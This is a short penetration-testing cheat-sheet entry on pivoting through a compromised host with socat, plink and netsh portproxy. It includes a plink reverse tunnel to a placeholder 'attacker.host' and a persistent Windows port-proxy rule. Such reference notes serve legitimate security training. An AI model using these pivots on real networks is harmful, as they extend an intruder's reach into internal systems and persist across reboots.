# 13.01 Socat Plink Netsh

> Pipe raw TCP between any port and host:port with `socat`, fall back to `plink` on Windows, or use built-in `netsh portproxy`.

## Overview

When SSH isn't available, socat creates raw TCP pipes from any port to any host:port. On Windows, plink (PuTTY) handles SSH; netsh portproxy is built-in.

## Steps

- **socat** — easiest UNIX redirector.
- **plink** — SSH client for Windows command line.
- **netsh portproxy** — built-in Windows redirector, persists across reboots.

## Commands

### socat / plink / netsh

```bash
# Linux relay <LHOST>:<LPORT> -> internal:80 (after foothold on pivot)
socat TCP-LISTEN:<LPORT>,fork,reuseaddr TCP:<TARGET>:80

# Windows plink (auto-yes host key)
echo y | plink -ssh -l user -pw 'pass' -R <LPORT>:localhost:<LPORT> attacker.host

# Windows built-in port proxy
netsh interface portproxy add v4tov4 listenport=4455 listenaddress=0.0.0.0 connectport=80 connectaddress=<TARGET>
netsh interface portproxy show all
```
